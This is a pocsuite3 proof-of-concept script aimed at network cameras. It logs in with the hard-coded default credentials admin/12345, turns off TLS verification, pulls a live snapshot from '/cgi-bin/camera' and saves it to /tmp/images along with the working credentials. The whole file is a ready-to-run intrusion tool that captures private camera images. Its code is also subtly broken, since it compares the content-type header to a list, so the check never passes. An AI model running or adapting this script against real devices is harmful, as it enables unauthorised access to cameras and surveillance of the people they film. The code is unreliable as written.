#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os.path

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
from requests import session
from requests.auth import HTTPDigestAuth
import re
from urllib.parse import urljoin,urlparse
minimum_version_required('1.9.11')


class DemoPOC(POCBase):



    def _verify(self):
            session = requests.session()
            host = re.search(r'([\w-]+\.)+\w{1,3}(:\d{1,6})?', self.url).group(0)
            creds = {
                'username': 'admin',
                'password': '12345'
            }
            header = {
                'Host': f'{host}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36',
                'Upgrade-Insecure-Requests':'1',
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
            }
            #proxy = '127.0.0.1:8080'
            #proxies = {
            #    'http': 'http://' + proxy,
            #    'https': 'https://' + proxy,
            #}
            url = self.url + '/cgi-bin/camera?resolution=640&quality=1&Language=1'
            res = requests.get(url, auth=HTTPDigestAuth(creds['username'], creds['password']),
                               headers=header,verify=False)#,proxies=proxies)
            if res.status_code == 200 and res.headers['Content-type'] == ['image/jpeg']:
                parsed = urlparse(res.url)
                image_dir = f"/tmp/images"
                if not os.path.exists(image_dir):
                    os.makedirs(image_dir)
                filename = os.path.join(image_dir,f"{parsed.netloc.replace(':','_')}") + '.jpg'
                with open(filename,'wb') as f:
                    f.write(res.content)
                    logger.info('sava snapshot to {}'.format(filename))
                    reslut = {'VerifyInfo': {'username': creds['username'], 'password': creds['password']}}
                    reslut['VerifyInfo']['url'] = url
                return self.parse_output(reslut)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
